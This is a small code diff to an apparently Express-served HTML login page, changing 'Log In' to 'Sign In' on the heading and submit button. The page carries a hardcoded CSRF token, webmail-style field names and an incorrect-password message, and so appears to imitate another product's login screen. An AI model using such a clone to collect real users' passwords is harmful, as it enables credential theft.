@@ -48,7 +48,7 @@ router.get('/', (req, res) => {
 								<input type="hidden" name="loginOp" value="login">
 								<input type="hidden" name="login_csrf" value="3a31bf0d-06cc-4314-8d78-39be2b852950">
 
-								<div class="signIn">Log In</div>
+								<div class="signIn">Sign In</div>
                         <div class="form">
                         <div id="errorMessageDiv" class="errorMessage">
                             The username or password is incorrect.</div>
@@ -82,7 +82,7 @@ router.get('/', (req, res) => {
                 </script>
                                     <div class="signInAndLabel">
                                         <div>
-                                            <button id="loginButton" type="submit" tabindex="5" class="loginButton">Log In</button>
+                                            <button id="loginButton" type="submit" tabindex="5" class="loginButton">Sign In</button>
                                         </div>
                                         <div class="rememberCheckWrapper"> 
                                                 <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme">
